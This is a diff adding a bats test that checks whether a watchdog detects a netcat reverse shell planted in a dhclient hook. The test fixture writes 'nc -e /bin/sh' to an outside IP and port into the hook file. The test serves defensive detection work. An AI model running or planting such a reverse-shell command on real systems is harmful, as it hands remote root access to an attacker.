@@ -272,3 +272,15 @@ seed_benign() {
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in dhclient hook: netcat-listening pipe also detected)" {
+    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks nc
+    # reverse-shell variant INVARIANTs. Lock the netcat axis on the
+    # DHCP-lease-event root-exec surface too.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${HOOKD}/zzz_benign"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
